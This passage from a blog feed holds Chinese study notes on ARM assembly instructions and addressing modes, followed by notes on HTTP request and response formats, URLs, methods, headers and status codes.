class="code"><pre><span class="line">LDR R1, [R0, #2];将R0中的值加2作为新地址，取该内存地址上的数据，保存到R1</span><br><span class="line">LDR R1, [R0, #2]!;与上一条的不同是：在加载完数据后，R0寄存器的值会增加2。即感叹号表示在执行LDR指令后，更新基址寄存器。</span><br><span class="line">LDR R1, [R0, R2];将R0+R2作为新地址，取该内存地址上的数据，保存到R1</span><br><span class="line">LDR R1, [R0, R2, LSL #2];将R0+R2&lt;&lt;2作为新地址，取该内存地址上的数据，保存到R1</span><br><span class="line">LDR R1, [R0], #2;将R0中的值作为地址，取该内存地址上的数据，保存到R1，然后R0寄存器值加2，与第二条的不同在于这里取数据用的是R0地址，最后再更新R0。第二条是先用R0+2作为地址取数据，再更新R0。</span><br><span class="line">STR R1, [R0, #-2];将R0中的值减2作为新地址，将R1中的值写入该地址</span><br><span class="line">STR R1, [R0], #-2;将R0中的值作为地址，将R1中的值写入该地址，然后R0寄存器值减2</span><br></pre></td></tr></table></figure><h3 id="多寄存器及块拷贝寻址"><a href="#多寄存器及块拷贝寻址" class="headerlink" title="多寄存器及块拷贝寻址"></a>多寄存器及块拷贝寻址</h3><p>首先要学习指令STM&#x2F;LDM这两个指令属于多寄存器寻址，一次可以给多个寄存器赋值，常常与IA，IB，DA，DB一起使用</p><table><thead><tr><th>指令后缀</th><th>含义</th></tr></thead><tbody><tr><td>IA (Increment after Operating)</td><td>操作完后地址递增</td></tr><tr><td>IB (Increment before Operating)</td><td>地址先增后完成操作</td></tr><tr><td>DA (Decrement after Operating)</td><td>操作完后地址递减</td></tr><tr><td>DB (Decrement before Operating)</td><td>地址先减后完成操作</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDMIA R0 &#123;R1-R5&#125;;以R0为基址读取五字存储单元数据加载至R1-R5，R1=[R0],R2=[R0+4],……</span><br><span class="line">STMIA R6, &#123;R1-R5&#125;;将R1-R5中数据依次存入R6为起始地址的存储单元</span><br></pre></td></tr></table></figure><p>在<code>&#123;&#125;</code>中的 <code>-</code>的意思是从一个寄存器到另一个寄存器，比如：R0-R2表示的是R0，R1，R2</p><p>注意在STM和LDM中第一个寄存器作为基址，第二个寄存器作为要传输的寄存器</p><h3 id="堆栈寻址"><a href="#堆栈寻址" class="headerlink" title="堆栈寻址"></a>堆栈寻址</h3><table><thead><tr><th>堆栈格式</th><th>含义</th></tr></thead><tbody><tr><td>FA（Full Ascending）</td><td>满递增堆栈</td></tr><tr><td>FD（Full Descending）</td><td>满递减堆栈</td></tr><tr><td>EA（Empty Ascending）</td><td>空递增堆栈</td></tr><tr><td>ED（Empty Descending）</td><td>空递减堆栈</td></tr></tbody></table><p><strong>满栈和空栈的区别</strong></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250507210322499.png" alt="image-20250507210322499"></p><p>总而言之，言而总之，区别就在于满栈是SP指向的是栈顶元素，空栈是SP指向栈顶元素的下一个存储单元</p><p>LDM和STM可以和FD，ED，FA，EA组合使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDMFD SP!, &#123;R0-R2,R14&#125;;将内存栈中的数据依次弹出到R0, R1, R2, R14</span><br><span class="line">STMFD SP!, &#123;R0-R2,R14&#125; ;将R14, R2, R1, R0依次压入内存栈</span><br></pre></td></tr></table></figure><p>栈的方向是由高地址向低地址</p><p>在ARM中也可以通过PUSH和POP来实现出栈和入栈的操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">STMFD SP!, &#123;R0-R2,R14&#125;;将R0、R1、R2、R14依次压入栈</span><br><span class="line">LDMFD SP!, &#123;R0-R2,R14&#125;;将栈中的数据依次弹出到R14、R2、R1、R0</span><br><span class="line">PUSH &#123;R0-R2,R14&#125;;将R0、R1、R2、R14依次压入栈</span><br><span class="line">POP &#123;R0-R2,R14&#125;;将栈中的数据依次弹出到R14、R2、R1、R0</span><br></pre></td></tr></table></figure><h3 id="相对寻址"><a href="#相对寻址" class="headerlink" title="相对寻址"></a>相对寻址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> ...</span><br><span class="line"> B LOOP</span><br><span class="line"> ...</span><br><span class="line">LOOP MOV R0, #1</span><br><span class="line"> MOV R1,R0</span><br><span class="line"> ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在X86汇编的学习中我们知道通过标签跳转的原理实际上就是通过相对地址来进行跳转的，相应的在ARM中也是相同的</p><h2 id="ARM汇编指令"><a href="#ARM汇编指令" class="headerlink" title="ARM汇编指令"></a>ARM汇编指令</h2><h3 id="存储访问指令"><a href="#存储访问指令" class="headerlink" title="存储访问指令"></a>存储访问指令</h3><p>在ARM汇编中，常用的指令是LDR&#x2F;STR和LDM&#x2F;STM两对指令，在干刚刚的寻址方式中我们也对两对指令有了初步的认识</p><p>而我们又在多寄存器及块拷贝寻址中了解到一次递增是四个字节，但如果我们想一次只读写一个字节呢，这时候就可以通过LDRB&#x2F;STRB指令来实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDRB R3, [R2], #1;以R2为地址读取一字节数据至R3，R2=R2+1</span><br><span class="line">STRH R1, [R0, #2]!;半字传送，传送R1中低两字节数据至R0+2为地址的存储单元，R0更新</span><br></pre></td></tr></table></figure><p><strong>后缀 ^</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LDMFD SP!, &#123;R0-R7, PC&#125;^;将SP指向的一片连续内存空间内的数据依次载入R0至R7以及PC寄存器；^符号表示在加载完成后，要将SPSR的值加载到CPSR中。</span><br></pre></td></tr></table></figure><p>这种指令通常用于函数返回时，将之前保存在栈中的寄存器值恢复，以及恢复程序状态寄存器的值，一般用于异常处理的返回</p><h3 id="数据处理类指令"><a href="#数据处理类指令" class="headerlink" title="数据处理类指令"></a>数据处理类指令</h3><h4 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h4><p>LDR&#x2F;SDR指令用于寄存器和内存之间传输数据，而要实现寄存器和寄存器之间的数据传输就可以使用MOV指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MOV R1, #1;将立即数1传送到寄存器R1中</span><br><span class="line">MOV R1, R0;将R0寄存器中的值传送到R1寄存器中</span><br><span class="line">MOV PC, LR;子程序返回</span><br></pre></td></tr></table></figure><h4 id="算数逻辑运算指令"><a href="#算数逻辑运算指令" class="headerlink" title="算数逻辑运算指令"></a>算数逻辑运算指令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ADD R2, R1, #1;R2=R1+1</span><br><span class="line">ADC R1, R1, #1;R1=R1+1+C(其中C为CPSR寄存器中进位)</span><br><span class="line">SUB R1, R1, R2;R1=R1-R2</span><br><span class="line">SBC R1, R1, R2;R1=R1-R2-C</span><br><span class="line">AND R0, R0, #立即数;R0与立即数进行按位与</span><br><span class="line">ORR R0, R0, #立即数;R0与立即数进行按位或</span><br><span class="line">EOR R0, R0, #立即数;R0与立即数进行按位异或</span><br><span class="line">BIC R0, R0, #立即数;R0与立即数的反码进行按位与</span><br></pre></td></tr></table></figure><h4 id="比较指令"><a href="#比较指令" class="headerlink" title="比较指令"></a>比较指令</h4><p>与X86汇编相同，比较指令影响的也是状态寄存器，在ARM中是影响CPSR的N，Z，C，V的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CMP R1, #10;R1-10,运算结果会影响N、Z、C、V位，不会保留运算结果</span><br><span class="line">CMP R1, R2;R1-R2,比较结果会影响N、Z、C、V位</span><br><span class="line">CMN R0, #1;R0 -(-1)将立即数取负,然后比较大小</span><br></pre></td></tr></table></figure><h3 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h3><p>跳转指令用于控制程序的走向，</p><ul><li>基本跳转指令B</li><li>带返回的跳转指令BL</li><li>带状态切换(ARM与Thumb之间)的跳转指令BX</li><li>带返回和状态切换的跳转指令BLX。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CMP R2, #0</span><br><span class="line">BEQ label;若R2=0,则跳转到label处执行</span><br><span class="line">...</span><br><span class="line">label</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>**BEQ：Branch if Equal (如果相等则跳转)**检测CPSR的Z标志位是否为1</p><p>相同的还有</p><table><thead><tr><th align="left">指令</th><th align="left">含义</th><th align="left">跳转条件</th></tr></thead><tbody><tr><td align="left"><code>BEQ</code></td><td align="left">Branch if Equal</td><td align="left"><code>Z = 1</code> (<code>R2 == 0</code>)</td></tr><tr><td align="left"><code>BNE</code></td><td align="left">Branch if Not Equal</td><td align="left"><code>Z = 0</code> (<code>R2 != 0</code>)</td></tr><tr><td align="left"><code>BGT</code></td><td align="left">Branch if Greater Than</td><td align="left"><code>Z = 0</code> 且 <code>N == V</code> (<code>R2 &gt; 0</code>)</td></tr><tr><td align="left"><code>BLT</code></td><td align="left">Branch if Less Than</td><td align="left"><code>N != V</code> (<code>R2 &lt; 0</code>)</td></tr></tbody></table><h3 id="程序状态寄存器访问指令"><a href="#程序状态寄存器访问指令" class="headerlink" title="程序状态寄存器访问指令"></a>程序状态寄存器访问指令</h3><p>当前程序状态寄存器可分为4个8位独立域：</p><ul><li>CPSR[31:24]：_f(标志域)</li><li>CPSR[23:16]：_s(状态域)</li><li>CPSR[15: 8]：_x(扩展域)</li><li>CPSR[7 : 0]：_c(控制域)</li></ul><h2 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h2><p>为了编译方便而产生的指令主要有四种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ADR R0, LOOP;将标号LOOP的地址保存到R0寄存器中</span><br><span class="line">ADRL R0, LOOP;中等范围的地址读取</span><br><span class="line">LDR R0, =0x30008000;将内存地址0x30008000赋值给R0</span><br><span class="line">NOP;空操作,用于延时或插入流水线中暂停指令的运行</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/qq_40309666/article/details/136149817?spm=1001.2014.3001.5501">到底什么是指令集？什么是微架构？他们是什么关系？-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_40309666/article/details/136147962?spm=1001.2014.3001.5502">ARM处理器有哪些工作模式和寄存器？各寄存器作用是什么？ARM异常中断处理流程？_异常中断 lr寄存器-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_40309666/article/details/136190638?spm=1001.2014.3001.5501">万字长文带你由浅入深夯实ARM汇编基础——汇编指令及寻址方式最全梳理（附示例）！_arm 与指令-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 汇编语言学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ARM汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP协议学习笔记</title>
      <link href="/2025/04/17/web/HTTP%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/04/17/web/HTTP%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP协议学习笔记"><a href="#HTTP协议学习笔记" class="headerlink" title="HTTP协议学习笔记"></a>HTTP协议学习笔记</h1><h2 id="HTTP协议是什么"><a href="#HTTP协议是什么" class="headerlink" title="HTTP协议是什么"></a>HTTP协议是什么</h2><p><strong>HTTP</strong>：（Hyper Text Transfer Protocol：超文本传输协议）</p><p>用于万维网的<strong>服务器传输超文本到本地浏览器</strong>的传输协议</p><p>是作用于应用层的协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">协议： 为了使数据在网络上从源头到达目的，网络通信的参与方必须遵循相同的规则，这套规则称为协议，它最终体现为在网络上传输的数据包的格式。</span><br></pre></td></tr></table></figure><h2 id="HTTP的工作流程"><a href="#HTTP的工作流程" class="headerlink" title="HTTP的工作流程"></a>HTTP的工作流程</h2><p>我们通过浏览器访问一个网站，会向哪个网站发送一个HTTP请求，网站接收到这个请求后会为我们回应一个HTTP响应，在我们实际的访问中不止一次请求和响应</p><p><strong>术语：</strong></p><ul><li>客户端：主动发起网络请求的一方</li><li>服务端：被动接收网络请求的一方</li><li>请求：客户端向服务端发送的数据</li><li>响应：服务端向客户断发送的数据</li></ul><p><strong>重要特点：</strong></p><p>一发一收，一问一答</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250408225728602.png" alt="image-20250408225728602"></p><p>除此之外还有</p><p>多发一收：发送大文件时</p><p>一发多收：搜索内容时</p><p>多发多收：串流</p><h2 id="HTTP请求报文和HTTP响应报文示例总览"><a href="#HTTP请求报文和HTTP响应报文示例总览" class="headerlink" title="HTTP请求报文和HTTP响应报文示例总览"></a>HTTP请求报文和HTTP响应报文示例总览</h2><p>这里我使用的是Burp Suite来抓取报文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/   </span><br><span class="line"></span><br><span class="line">#官方测试域名</span><br></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><h4 id="请求报文"><a href="#请求报文" class="headerlink" title="请求报文"></a>请求报文</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="响应报文"><a href="#响应报文" class="headerlink" title="响应报文"></a>响应报文</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Type: text/html</span><br><span class="line">ETag: &quot;84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134&quot;</span><br><span class="line">Last-Modified: Mon, 13 Jan 2025 20:11:20 GMT</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 1256</span><br><span class="line">Cache-Control: max-age=2857</span><br><span class="line">Date: Wed, 09 Apr 2025 14:01:52 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Example Domain&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot; /&gt;</span><br><span class="line">    &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">        background-color: #f0f0f2;</span><br><span class="line">        margin: 0;</span><br><span class="line">        padding: 0;</span><br><span class="line">        font-family: -apple-system, system-ui, BlinkMacSystemFont, &quot;Segoe UI&quot;, &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    div &#123;</span><br><span class="line">        width: 600px;</span><br><span class="line">        margin: 5em auto;</span><br><span class="line">        padding: 2em;</span><br><span class="line">        background-color: #fdfdff;</span><br><span class="line">        border-radius: 0.5em;</span><br><span class="line">        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);</span><br><span class="line">    &#125;</span><br><span class="line">    a:link, a:visited &#123;</span><br><span class="line">        color: #38488f;</span><br><span class="line">        text-decoration: none;</span><br><span class="line">    &#125;</span><br><span class="line">    @media (max-width: 700px) &#123;</span><br><span class="line">        div &#123;</span><br><span class="line">            margin: 0 auto;</span><br><span class="line">            width: auto;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &lt;/style&gt;    </span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;h1&gt;Example Domain&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;This domain is for use in illustrative examples in documents. You may use this</span><br><span class="line">    domain in literature without prior coordination or asking for permission.&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;a href=&quot;https://www.iana.org/domains/example&quot;&gt;More information...&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="格式总览"><a href="#格式总览" class="headerlink" title="格式总览"></a>格式总览</h3><h4 id="请求报文-1"><a href="#请求报文-1" class="headerlink" title="请求报文"></a>请求报文</h4><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250409200123655.png" alt="image-20250409200123655"></p><h4 id="响应报文-1"><a href="#响应报文-1" class="headerlink" title="响应报文"></a>响应报文</h4><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250409200149846.png" alt="image-20250409200149846"></p><h2 id="HTTP请求（Request）"><a href="#HTTP请求（Request）" class="headerlink" title="HTTP请求（Request）"></a>HTTP请求（Request）</h2><h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><h4 id="什么是URL"><a href="#什么是URL" class="headerlink" title="什么是URL"></a>什么是URL</h4><p>URL也就是我们平时看见的网址，英文（Uniform Resource Locator：统一资源定位符），在互联网上每个文件都有一个唯一URL用于表示这个文件的位置，以及浏览器应该怎么处理他</p><h4 id="URL的格式"><a href="#URL的格式" class="headerlink" title="URL的格式"></a>URL的格式</h4><p><strong>标准格式</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">协议类型:[//服务器地址[:端口号]][/资源层级 UNIX 文件路径]文件名[?查询字符串][#片段标识符]</span><br></pre></td></tr></table></figure><p><strong>完整格式</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">协议类型:[//[访问资源需要的凭证信息@]服务器地址[:端口号]][/资源层级 UNIX 文件路径]文件名[?查询字符串][#片段标识符]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250409201316510.png" alt="image-20250409201316510"></p><p><strong>参数介绍</strong></p><p>由于本篇文章主要学习HTTP，URL参数就简单介绍</p><ul><li><strong>Protocol（协议）</strong>：协议是用于指定传输数据的规矩和标准，在URL的最前面，通常以 <code>://</code>结尾</li><li><strong>Sub Domain（子域名）</strong>： 子域名是主域名之前的部分，他的作用是将主域名的一部分或者子网独立开来，通常用来创建站带你的不同部分，它可以用于区分不同服务，地区划分，语言划分</li><li><strong>Domain name（域名）</strong>：域名是互联网的标识符，由两部分组成，顶级域名（TLD）和二级域名（SLD）他们之间的关系是父子关系，他们一起组成主域名</li><li><strong>Port（端口）</strong>： 通过域名我们就可以确定一个服务器了，而通过端口用于区分同一服务器的不同服务与域名由 <code>:</code>分隔</li><li><strong>Path（路径）</strong>： 路径用于标识资源在服务器上的具体位置，在域名和端口号之后，以 <code>\</code>分格</li><li><strong>Query（查询字符串）</strong>： 在路径之后由 <code>?</code>开始后面是 <code>key=value</code>的键值对，多个键值对之间使用 <code>&amp;</code>分隔</li><li><strong>Parameters（参数）</strong>：通常以键值对的形式出现，与查询字符串有一点重叠，但相较概念更广泛，包括路径参数，查询参数，头部参数</li><li><strong>Fragment（片段标识符）</strong>：最后的最后是片段标识符，用来定位页面中的特殊片段，以 <code>#</code>开头 ，用于跳转到页面中的特定部分，单页应用（SPA）中的路由，表单校验与提示</li></ul><p>这里挂出我的博客举例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://likunvs.github.io/</span><br></pre></td></tr></table></figure><h4 id="URLencode"><a href="#URLencode" class="headerlink" title="URLencode"></a>URLencode</h4><p>我们复制一个搜索时的url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cn.bing.com/search?pglt=161&amp;q=URL%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3&amp;cvid=2d52a81c20294ab794c0c657acd9f5e8&amp;gs_lcrp=EgRlZGdlKgYIABBFGDkyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQg1NTE5ajBqMagCCLACAQ&amp;FORM=ANNTA1&amp;adppc=EDGEDBB&amp;PC=CNNDDB</span><br></pre></td></tr></table></figure><p>观察上面的url我们会发现有些数据是以%开头的 <code>%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3</code>为什么会出现这种情况呢，我们先将这些数据urlencode</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250409210256912.png" alt="image-20250409210256912"></p><p>发现他是普通的中文字符</p><p><strong>为什么要以这种形式表达</strong></p><p>在URL 的规范（RFC 3986）定义了保留字符（Reserved Characters）和非保留字符（Unreserved Characters）：</p><ul><li><strong>保留字符</strong>：在 URL 中有特殊含义，不能直接使用，如：<ul><li><code>/</code>（路径分隔符）</li><li><code>?</code>（查询参数起始符）</li><li><code>&amp;</code>（参数分隔符）</li><li><code>=</code>（键值对连接符）</li><li><code>#</code>（片段标识符）</li><li><code>%</code>（编码标识符）</li><li>空格（必须转义为 <code>%20</code> 或 <code>+</code>）</li></ul></li><li><strong>非保留字符</strong>：可以直接使用，如字母（<code>A-Za-z</code>）、数字（<code>0-9</code>）、<code>-</code>, <code>_</code>, <code>.</code>, <code>~</code>。</li></ul><p>如果参数值中包含这些保留字符或非 ASCII 字符（如中文），就必须进行 URL 编码。</p><h3 id="认识”方法“（method）"><a href="#认识”方法“（method）" class="headerlink" title="认识”方法“（method）"></a>认识”方法“（method）</h3><p><strong>方法</strong>是HTTP请求报文中首行第一部分的内容，原本HTTP设计者是想通过不同的方法来表示不同的语义，但是并没有怎么用，实现的功能完全由程序员在代码中决定，最常用的方法是 <strong>GET ， POST</strong></p><table><thead><tr><th>方法</th><th>说明</th><th>适用版本号</th></tr></thead><tbody><tr><td>GET</td><td>获取资源</td><td>HTTP 1.0、HTTP 1.1</td></tr><tr><td>POST</td><td>传输实体主体</td><td>HTTP 1.0、HTTP 1.1</td></tr><tr><td>PUT</td><td>传输文件</td><td>HTTP 1.0、HTTP 1.1</td></tr><tr><td>HEAD</td><td>获得报文首部</td><td>HTTP 1.0、HTTP 1.1</td></tr><tr><td>DELETE</td><td>删除文件</td><td>HTTP 1.0、HTTP 1.1</td></tr><tr><td>OPTIONS</td><td>访问支持的方法</td><td>HTTP 1.1</td></tr><tr><td>TRACE</td><td>追踪路径</td><td>HTTP 1.1</td></tr><tr><td>CONNECT</td><td>要求用隧道协议连接代理</td><td>HTTP 1.1</td></tr><tr><td>LINK</td><td>建立和资源之间的联系</td><td>HTTP 1.1</td></tr><tr><td>UNLINE</td><td>断开连接关系</td><td>HTTP 1.1</td></tr></tbody></table><h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><p>GET是HTTP最常用的方法，常用于获取服务器上的某个资源</p><p><strong>GET特点</strong></p><ul><li>请求报文首行的第一部分</li><li>对URL中的query不要求</li><li>GET请求header中有若干个键值对</li><li>GET中的bady一般为空</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><p>post也是HTTP常用的方法，常常用于将用户输入的数据传输给服务器</p><p><strong>POST特点</strong></p><ul><li>首行第一部分</li><li>对URL中的query不要求</li><li>header有若干键值对</li><li>body一般有值</li></ul><h3 id="请求报头（header）"><a href="#请求报头（header）" class="headerlink" title="请求报头（header）"></a>请求报头（header）</h3><p>header的格式是键值对的结构，每个键值对占一行，键和值之间使用 <code>:</code>分隔</p><p><strong>常见报头：</strong></p><ul><li><p>**Host：**表示服务器主机的地址和端口</p></li><li><p>**Content-Length：**表示body的数据长度</p></li><li><p>**Content-Type：**表示body的数据格式</p></li><li><p>**User-Agent：**表示浏览器或者操作系统的属性</p></li><li><p>**Referer：**表示这个页面是从那个页面跳转过来的</p></li><li><p>**X-Forwarded-For:**用于伪造ip地址</p></li><li><p>**via：**表示代理</p></li><li><p>**location：**表示要跳转的地址</p></li></ul><h2 id="HTTP响应（Response）"><a href="#HTTP响应（Response）" class="headerlink" title="HTTP响应（Response）"></a>HTTP响应（Response）</h2><h3 id="状态码（status-code）"><a href="#状态码（status-code）" class="headerlink" title="状态码（status code）"></a>状态码（status code）</h3><p>状态码表示访问一个页面的结果，按照第一位数分为5大类（1xx,2xx,3xx,4xx,5xx），每个大类含义不同</p><p><strong>200 OK</strong></p><p>表示访问成功</p><p><strong>404 Not Found</strong></p><p>表示没有找到资源</p><p><strong>403 Forbidden</strong></p><p>表示访问被拒绝</p><p><strong>405 Mrthod Not Allowed</strong></p><p>表示访问的服务器不能支持请求中的方法或者不能使用请求中的方法</p><p><strong>500 Internal Server Error</strong></p><p>表示服务器内部错误</p><p><strong>504 Gateway Timeout</strong></p><p>表示当前服务器负载比较大导致的超时</p><p><strong>302 Move temporarily</strong></p><p>表示临时重定向</p><p><strong>301 Moved Permanently</strong></p><p>表示永久重定向</p><h3 id="响应”报文“（header）"><a href="#响应”报文“（header）" 